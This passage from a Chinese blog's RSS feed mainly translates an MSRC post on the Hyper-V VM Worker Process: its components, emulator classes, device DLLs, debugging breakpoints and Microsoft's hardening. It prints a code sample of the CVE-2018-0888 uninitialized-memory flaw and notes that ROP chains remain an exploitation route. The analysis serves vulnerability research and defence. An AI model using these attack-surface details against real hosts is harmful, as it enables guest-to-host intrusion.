&lt;p&gt;将x86_64解码器模糊测试工具Mishegos的输出格式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从JSON改为紧凑二进制格式&lt;/li&gt;
&lt;li&gt;开发mish2jsonl转换工具保持向后兼容&lt;/li&gt;
&lt;li&gt;更新分析工具处理新增的符号字段&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;thomas-quig--crytic与slither&#34;&gt;Thomas Quig — Crytic与Slither
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;伊利诺伊大学香槟分校&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将Slither的智能合约升级检查集成到Crytic CI服务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实现合约版本选择界面&lt;/li&gt;
&lt;li&gt;检查代理合约模式的风险点（如存储变量对齐）&lt;/li&gt;
&lt;li&gt;输出标准化JSON格式的检测结果&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;william-wang--openssl与anselm&#34;&gt;William Wang — OpenSSL与Anselm
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;加州大学洛杉矶分校&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;开发OpenSSL API误用检测工具Anselm：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;编写LLVM Pass构建API调用图&lt;/li&gt;
&lt;li&gt;实现基础启发式规则（如密码上下文初始化检查）&lt;/li&gt;
&lt;li&gt;支持跨语言OpenSSL绑定分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;未来计划增强参数/返回值分析能力，完善开发者接口。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入解析Hyper-V虚拟机工作进程(VMWP)攻击面与漏洞挖掘</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90hyper-v%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B7%A5%E4%BD%9C%E8%BF%9B%E7%A8%8Bvmwp%E6%94%BB%E5%87%BB%E9%9D%A2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
        <pubDate>Sun, 03 Aug 2025 04:31:08 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90hyper-v%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B7%A5%E4%BD%9C%E8%BF%9B%E7%A8%8Bvmwp%E6%94%BB%E5%87%BB%E9%9D%A2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</guid>
        <description>&lt;h1 id=&#34;攻击虚拟机工作进程--msrc博客&#34;&gt;攻击虚拟机工作进程 | MSRC博客
&lt;/h1&gt;&lt;p&gt;在过去一年中，我们投入了大量时间使Hyper-V研究更易于开展。首篇博客《Hyper-V研究第一步》描述了调试管理程序的工具和设置，并分析了虚拟化堆栈组件的攻击面。随后发表的《Hyper-V中准虚拟化设备的模糊测试》聚焦于VSPs-VSCs通过VMBus的通信机制，披露了根分区内核(vpcivsp.sys)中vPCI VSP的客户机到主机漏洞。八月，Joe Bialek在Black Hat上的精彩演讲展示了如何利用虚拟机工作进程(VMWP)中IDE模拟器的另一个漏洞。现在，让我们深入探究VMWP内部机制。&lt;/p&gt;
&lt;h2 id=&#34;虚拟机工作进程是什么&#34;&gt;虚拟机工作进程是什么？
&lt;/h2&gt;&lt;p&gt;虚拟化堆栈中最大的攻击面之一就实现在根分区的用户空间——虚拟机工作进程(VMWP.exe)。每个虚拟机对应一个VMWP.exe进程实例，其主要组件包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;vSMB服务器&lt;/li&gt;
&lt;li&gt;Plan9文件系统&lt;/li&gt;
&lt;li&gt;集成组件(IC)&lt;/li&gt;
&lt;li&gt;虚拟设备（模拟器/非模拟设备）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;VMWP可视为微软的&amp;quot;QEMU&amp;quot;式进程，负责实现模拟/非模拟设备。这类组件通常非常复杂，而复杂实现往往容易出错&amp;hellip;&lt;/p&gt;
&lt;h2 id=&#34;vmwp内部机制&#34;&gt;VMWP内部机制
&lt;/h2&gt;&lt;h3 id=&#34;整体架构&#34;&gt;整体架构
&lt;/h3&gt;&lt;p&gt;工作进程通过虚拟化基础设施驱动(vid.sys)与hypervisor通信。VID使用hypercall向hypervisor发送管理命令，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建/删除分区&lt;/li&gt;
&lt;li&gt;挂起/恢复分区&lt;/li&gt;
&lt;li&gt;动态内存管理&lt;/li&gt;
&lt;li&gt;添加/删除虚拟处理器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;VID通知分发器(VND)是关键组件，允许客户端注册并接收来自客户机的动作通知。x64架构支持的VID通知类型包括：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;enum&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;_VID_MESSAGE_TYPE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;VidMessageMbpAccess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;VidMessageException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0002&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VID_MESSAGE_TYPE_FLAG_INTERCEPT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;VidMessageTripleFault&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0003&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VID_MESSAGE_TYPE_FLAG_INTERCEPT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;VidMessageExecuteInstruction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0004&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VID_MESSAGE_TYPE_FLAG_INTERCEPT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;VidMessageMmio&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0005&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VID_MESSAGE_TYPE_FLAG_INTERCEPT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//...共18种消息类型
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VID_MESSAGE_TYPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;关键组件&#34;&gt;关键组件
&lt;/h3&gt;&lt;h4 id=&#34;指令模拟器&#34;&gt;指令模拟器
&lt;/h4&gt;&lt;p&gt;EmulatorVP类实现了x86/x64指令模拟，包含约250个函数，主要分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;EmulatorVp::Execute*Instruction&lt;/code&gt;：指令执行模拟入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EmulatorVP::Execute*Op&lt;/code&gt;：具体操作处理&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EmulatorVp::ExecuteIs*&lt;/code&gt;：RFLAGS状态检查&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EmulatorVP::Decode*&lt;/code&gt;：指令解码器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;典型调用栈示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;VndCompletionThread
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─VndCompletionHandler::HandleVndCallback
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  └─EmulatorVp::DispatchMmioOperation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      └─EmulatorVp::ExecuteGEInstruction
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;虚拟设备&#34;&gt;虚拟设备
&lt;/h4&gt;&lt;p&gt;虚拟设备分为三类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;模拟设备&lt;/strong&gt;：完整模拟硬件设备（如e1000网卡）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;准虚拟化设备&lt;/strong&gt;：专为虚拟环境设计的虚拟设备&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;直通设备&lt;/strong&gt;：允许客户机直接访问物理硬件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;主要设备模拟DLL及其功能：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;DLL名称&lt;/th&gt;
          &lt;th&gt;功能范围&lt;/th&gt;
          &lt;th&gt;模拟设备示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;VmEmulatedDevices.dll&lt;/td&gt;
          &lt;td&gt;1500+函数&lt;/td&gt;
          &lt;td&gt;PIIX芯片组、DMA控制器、PS/2键盘&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;vmuidevices.dll&lt;/td&gt;
          &lt;td&gt;1500+函数&lt;/td&gt;
          &lt;td&gt;视频设备、输入管理器、HID设备&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;vmEmulatedNic.dll&lt;/td&gt;
          &lt;td&gt;网络设备&lt;/td&gt;
          &lt;td&gt;DEC 21041/21140A/21143网卡&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;VmEmulatedStorage.dll&lt;/td&gt;
          &lt;td&gt;存储设备&lt;/td&gt;
          &lt;td&gt;IDE控制器、光驱、软盘驱动器&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;pci配置访问示例&#34;&gt;PCI配置访问示例
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;STDMETHOD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NotifyPciConfigAccess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_In_&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PCI_BUS_NUMBER&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;Bus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_In_&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PCI_DEVICE_NUMBER&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;DeviceNumber&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_In_&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PCI_FUNCTION_NUMBER&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;FunctionNumber&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_In_&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UINT16&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;InRegAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_In_&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BOOLEAN&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;InIsWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_Inout_&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UINT32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;             &lt;span class=&#34;n&#34;&gt;IoData&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该接口由多个设备类实现，包括：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vmchipset!VmEmu::WCL::PciHandler::NotifyPciConfigAccess
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;VmEmulatedStorage!IdeControllerDevice::NotifyPciConfigAccess
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vmemulateddevices!VideoS3Device::NotifyPciConfigAccess
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;调试实践&#34;&gt;调试实践
&lt;/h3&gt;&lt;p&gt;通过内核调试器执行&lt;code&gt;out 0x1f0, 0x41414141&lt;/code&gt;指令，在VMWP中设置断点：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bp vmemulatedstorage!IdeControllerDevice::NotifyIoPortWrite
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;可观察到完整的IO端口写入调用链。&lt;/p&gt;
&lt;h2 id=&#34;漏洞案例研究&#34;&gt;漏洞案例研究
&lt;/h2&gt;&lt;h3 id=&#34;cve-2018-0888&#34;&gt;CVE-2018-0888
&lt;/h3&gt;&lt;p&gt;电池模拟器中的未初始化内存漏洞：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BatteryEmulator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MmioRead&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;uint64_t&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* RangeBase */&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;uint64_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RangeOffset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;uint64_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NumberOfBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_Out_writes_bytes_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NumberOfBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ReadBuffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;noexcept&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;UINT32&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;readValue&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NumberOfBytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 未初始化ReadBuffer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;攻击者可利用此漏洞读取主机内存敏感信息。&lt;/p&gt;
&lt;h2 id=&#34;vmwp加固措施&#34;&gt;VMWP加固措施
&lt;/h2&gt;&lt;p&gt;微软实施了以下安全防护：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;控制流防护(CFG)&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;启用CFG导出抑制&lt;/li&gt;
&lt;li&gt;强制CFG校验&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;任意代码防护(ACG)&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;禁止分配/映射可执行页面&lt;/li&gt;
&lt;li&gt;禁止修改可执行页面保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码完整性防护(CIG)&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;禁止加载未签名DLL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;移除SeImpersonatePrivilege权限&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;尽管有这些缓解措施，攻击者仍可能通过ROP链或文件系统API等途径实现利用。&lt;/p&gt;
